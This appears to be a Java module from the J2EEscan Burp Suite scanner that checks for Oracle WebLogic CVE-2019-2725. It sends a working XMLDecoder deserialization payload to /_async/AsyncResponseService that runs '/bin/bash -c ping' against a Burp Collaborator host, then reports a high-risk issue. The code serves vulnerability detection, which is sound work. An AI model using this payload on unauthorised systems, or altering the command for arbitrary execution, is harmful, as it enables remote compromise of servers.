package burp.scan.active.poc;

import burp.*;
import burp.scan.active.ModuleBase;
import burp.scan.active.feature.RunOnce;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.PrintWriter;
import java.net.URL;
import java.util.*;

public class WeblogicCVE20192725 implements ModuleBase, RunOnce {
    private static final String TITLE = "Weblogic - AsyncResponseService Remote Command Execution";
    private static final String DESCRIPTION = "J2EEscan identified a remote command execution the path <code> /_async/AsyncResponseService</code><br />"
            + "An insecure deserialization vulnerability has been reported in Oracle WebLogic server. <br />"
            + "User input is validated to ensure that tags that result in arbitrary method and constructor calls are blacklisted.<br /> "
            + "The &lt;class&gt; tag is not correctly blacklisted. This allows the attacker to initiate any class with arbitrary constructor arguments.<br />"
            + "Attackers leverage this to achieve arbitrary code execution, by initiating a class object which accepts a byte array as a constructor argument. "
            + "<br />Upon initialization, the crafted malicious serialized byte array gets deserialized causing arbitrary remote code execution.<br /><br />"
            + "<b>References:</b>"
            + "<ul><li>https://www.oracle.com/security-alerts/alert-cve-2019-2725.html</li></ul>";

    private static final String REMEDY = "Update the Weblogic componenent with the last security patches provided by Oracle";

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();
    private PrintWriter stderr;

    private static final List<String> ASYNC_PATHS = Arrays.asList(
            "/_async/AsyncResponseService"
    );


    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        List<IScanIssue> issues = new ArrayList<>();
        var baseRequestResponse = webInfo.getHttpRequestResponse();
        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);
        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL url = reqInfo.getUrl();
        String host = url.getHost();
        int port = url.getPort();

        String system = host.concat(Integer.toString(port));

        // System not yet tested for this vulnerability
        if (!hs.contains(system)) {

            hs.add(system);

            String protocol = url.getProtocol();

            String serializedRce = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">   "
                    + "<soapenv:Header>"
                    + "<wsa:Action>ONRaJntRjNYBc3MJW2JC</wsa:Action>"
                    + "<wsa:RelatesTo>42PlWZ15ODi1hQ3pQ5Ol</wsa:RelatesTo>"
                    + "<work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">"
                    + "<void class=\"java.lang.ProcessBuilder\">"
                    + "<array class=\"java.lang.String\" length=\"3\">"
                    + "<void index=\"0\">"
                    + "<string>/bin/bash</string>"
                    + "</void>"
                    + "<void index=\"1\">"
                    + "<string>-c</string>"
                    + "</void>"
                    + "<void index=\"2\">"
                    + "<string>ping -c 3 %s</string>"
                    + "</void>"
                    + "</array>"
                    + "<void method=\"start\"/></void>"
                    + "</work:WorkContext>"
                    + "</soapenv:Header>"
                    + "<soapenv:Body>"
                    + "<asy:onAsyncDelivery/>"
                    + "</soapenv:Body></soapenv:Envelope>";

            // Collaborator context
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

            for (String ASYNC_PATH : ASYNC_PATHS) {

                List<String> headers = new ArrayList<>();
                headers.add(String.format("POST %s HTTP/1.1", ASYNC_PATH));
                headers.add("Host: " + url.getHost() + ":" + url.getPort());
                headers.add("Content-Type: text/xml");
                headers.add("Cookie: ADMINCONSOLESESSION=pTsBVcsdVx2g20mxPJyyPDvqTwQmQDtw7R541DGJGGXD2qh4rDBJ!1211788216");

                String finalPayload = String.format(serializedRce, currentCollaboratorPayload);

                byte[] serializedMessage = helpers.buildHttpMessage(headers, finalPayload.getBytes());
                IHttpRequestResponse resp = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), serializedMessage);

                // Poll Burp Collaborator for remote interaction
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {
                    issues.add(new GtScanIssue(
                            baseRequestResponse.getHttpService(),
                            helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            resp,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain));

                    webInfo.addIssues(issues);
                    return ;

                }

            }
        }

        webInfo.addIssues(issues);
        return ;
    }

    @Override
    public Set<String> getTags() {
        Set<String> tags = new HashSet<>();
        tags.add(TagUtils.toStandardName(TagTypes.WebLogic_Java));
        return tags;
    }
}
